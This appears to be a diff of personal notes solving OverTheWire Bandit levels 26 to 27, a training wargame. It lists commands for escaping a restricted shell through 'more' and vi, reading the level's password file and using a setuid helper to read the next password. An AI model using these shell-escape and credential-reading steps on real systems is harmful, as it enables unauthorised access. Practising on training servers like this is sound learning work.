@@ -1,0 +1,8 @@
+ssh -i ./bandit26.sshkey -p2220 bandit26@bandit # Sjatiy ecran
+# more
+v
+# vi
+:set shell=/bin/bash
+:shell
+cat /etc/bandit_pass/bandit26
+./bandit27-do cat /etc/bandit_pass/bandit27
